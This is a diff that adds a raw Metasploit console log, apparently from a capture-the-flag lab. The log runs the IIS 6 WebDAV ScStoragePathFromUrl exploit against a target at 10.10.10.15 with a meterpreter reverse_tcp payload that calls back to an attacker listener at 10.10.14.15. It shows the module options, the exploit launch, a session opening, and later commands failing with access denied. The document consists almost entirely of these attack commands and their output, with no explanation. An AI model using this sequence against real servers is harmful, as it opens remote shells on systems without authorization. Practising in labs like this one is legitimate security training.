@@ -1,1 +1,63 @@
 
+msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhost 10.10.10.15
+rhost => 10.10.10.15
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.15
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.15:1030) at 2021-01-26 21:47:49 +0800
+
+meterpreter > 
+
+
+
+meterpreter > getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+
+
+
+
+meterpreter > cd Lakis
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+meterpreter > cd Administrator
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+
+
+
